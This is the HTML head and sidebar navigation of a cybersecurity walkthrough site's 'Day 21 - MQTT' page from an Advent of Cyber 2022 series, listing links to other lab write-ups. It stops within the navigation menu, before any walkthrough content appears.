
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="A collection of notes and writeups from my journey through cyber security concepts.">
      
      
        <meta name="author" content="Nouman Noor">
      
      
        <link rel="canonical" href="https://nanoor.github.io/CyberSec/walkthroughs/thm/adventofcyber2022/day21/">
      
      
        <link rel="prev" href="../day20/">
      
      
        <link rel="next" href="../../authenticationbypass/">
      
      
      <link rel="icon" href="../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.46">
    
    
      
        <title>Day 21 - MQTT - CyberSec</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.6f8fc17f.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#introduction-to-iot" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../../.." title="CyberSec" class="md-header__button md-logo" aria-label="CyberSec" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            CyberSec
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Day 21 - MQTT
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1M8 13h8v-2H8zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4a5 5 0 0 0 5-5 5 5 0 0 0-5-5"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
    
      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../../.." class="md-tabs__link">
        
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
    
    
      
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../notes/misc/shellstabilisation/" class="md-tabs__link">
          
  
    
  
  Notes

        </a>
      </li>
    
  

    
  

      
        
  
  
    
  
  
    
    
      
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../../activedirectorybasics/" class="md-tabs__link">
          
  
    
  
  Walkthroughs

        </a>
      </li>
    
  

    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../.." title="CyberSec" class="md-nav__button md-logo" aria-label="CyberSec" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>

    </a>
    CyberSec
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Notes
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Misc
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            Misc
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../notes/misc/shellstabilisation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Shell Stabilisation
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Network
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            Network
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../notes/network/dns/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DNS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../notes/network/osimodel/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSI Model
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Privilege Escalation (Linux)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Privilege Escalation (Linux)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../notes/privesc_linux/crontab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cron Jobs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../notes/privesc_linux/passwdshadow/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Passwd/Shadow File
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../notes/privesc_linux/pathvariable/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Path Variable
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../notes/privesc_linux/suid/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SUID
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
      
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Walkthroughs
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Walkthroughs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
      
      
        
          
          
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
        
          
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="">
            
  
  <span class="md-ellipsis">
    THM
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            THM
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../activedirectorybasics/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory Basics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" checked>
        
          
          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Advent of Cyber 2022
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_1_2">
            <span class="md-nav__icon md-icon"></span>
            Advent of Cyber 2022
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 1 - Frameworks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 2 - Log Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 3 - OSINT
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day4/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 4 - Scanning
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day5/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 5 - Brute Force
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day6/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 6 - Email Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day7/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 7 - Cyber Chef
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day8/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 8 - Smart Contracts
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day9/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 9 - Pivoting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day10/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 10 - Hack a Game
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day11/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 11 - Memory Forensics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day12/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 12 - Malware Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day13/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 13 - Packet Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day14/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 14 - Web Applications
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day15/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 15 - Secure Coding (Securing File Upload)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day16/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 16 - Secure Coding (SQLi)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day17/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 17 - Secure Coding (Regular Expressions)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day18/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 18 - Sigma
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day19/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 19 - Hardware Hacking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../day20/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 20 - Firmware Reverse Engineering
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Day 21 - MQTT
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Day 21 - MQTT
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction-to-iot" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction to IoT
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#messaging-protocols-and-middleware" class="md-nav__link">
    <span class="md-ellipsis">
      Messaging Protocols and Middleware
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#functionality-of-a-publishsubscribe-model" class="md-nav__link">
    <span class="md-ellipsis">
      Functionality of a Publish/Subscribe Model
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#interacting-with-mqtt" class="md-nav__link">
    <span class="md-ellipsis">
      Interacting with MQTT
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Interacting with MQTT">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#subscribing-to-a-topic" class="md-nav__link">
    <span class="md-ellipsis">
      Subscribing to a Topic
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#publishing-to-a-topic" class="md-nav__link">
    <span class="md-ellipsis">
      Publishing to a Topic
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ctf-questions" class="md-nav__link">
    <span class="md-ellipsis">
      CTF Questions
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../authenticationbypass/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Authentication Bypass
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../basicpentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Basic Pentesting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../blue/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Blue
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../commandinjection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Command Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../commonlinuxprivesc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Common Linux Privesc
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../crosssitescripting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cross-site Scripting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../fileinclusion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    File Inclusion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hydra/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hydra
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../idor/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    IDOR
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../johntheripper/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    John the Ripper
  </span>
  

